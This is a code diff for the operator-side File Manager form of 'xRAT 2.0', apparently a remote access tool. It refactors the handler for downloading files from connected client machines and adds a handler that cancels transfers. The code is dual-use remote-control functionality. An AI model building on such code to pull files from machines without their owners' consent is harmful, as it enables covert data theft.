@@ -2,7 +2,6 @@
 using System.Diagnostics;
 using System.IO;
 using System.Windows.Forms;
-using System.Threading;
 using xServer.Core;
 using xServer.Core.Misc;
 
@@ -102,39 +101,28 @@ namespace xServer.Forms
 
         private void ctxtDownload_Click(object sender, EventArgs e)
         {
-            if (_connectClient != null)
+            foreach (ListViewItem files in lstDirectory.SelectedItems)
             {
-                if (lstDirectory.SelectedItems.Count != 0)
+                if (files.Tag.ToString() == "file")
                 {
-                    new Thread(() =>
+                    string path = _currentDir;
+                    if (path.EndsWith(@"\"))
+                        path = path + files.SubItems[0].Text;
+                    else
+                        path = path + @"\" + files.SubItems[0].Text;
+
+                    int ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index; // ;)
+
+                    if (_connectClient != null)
                     {
-                        foreach (ListViewItem files in lstDirectory.SelectedItems)
+                        new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(_connectClient);
+
+                        this.Invoke((MethodInvoker) delegate
                         {
-                            if (files.Tag.ToString() == "file")
-                            {
-                                string path = _currentDir;
-                                if (path.EndsWith(@"\"))
-                                    path = path + files.SubItems[0].Text;
-                                else
-                                    path = path + @"\" + files.SubItems[0].Text;
-
-                                int ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index;
-
-                                new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(_connectClient);
-
-                                ListViewItem lvi =
-                                    new ListViewItem(new string[]
-                                    {ID.ToString(), "Downloading...", files.SubItems[0].Text});
-
-                                this.Invoke((MethodInvoker) delegate
-                                {
-                                    lstTransfers.Items.Add(lvi);
-                                });
-
-                                Thread.Sleep(50);
-                            }
-                        }
-                    }).Start();
+                            ListViewItem lvi = new ListViewItem(new string[] { ID.ToString(), "Downloading...", files.SubItems[0].Text });
+                            lstTransfers.Items.Add(lvi);
+                        });
+                    }
                 }
             }
         }
@@ -172,7 +160,7 @@ namespace xServer.Forms
                     else
                         path = path + @"\" + files.SubItems[0].Text;
 
-                    if (InputBox.Show("New name", "Enter new name:", ref newName) == System.Windows.Forms.DialogResult.OK)
+                    if (InputBox.Show("New name", "Enter new name:", ref newName) == DialogResult.OK)
                     {
                         if (_currentDir.EndsWith(@"\"))
                             newName = _currentDir + newName;
@@ -251,6 +239,16 @@ namespace xServer.Forms
                 Process.Start(downloadPath);
             else
                 MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+
+        private void ctxtCancel_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
+            {
+                if (!transfer.SubItems[1].Text.StartsWith("Downloading")) return;
+                if (_connectClient != null)
+                    new Core.Packets.ServerPackets.DownloadFileCanceled(int.Parse(transfer.Text)).Execute(_connectClient);
+            }
         }
 
         private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
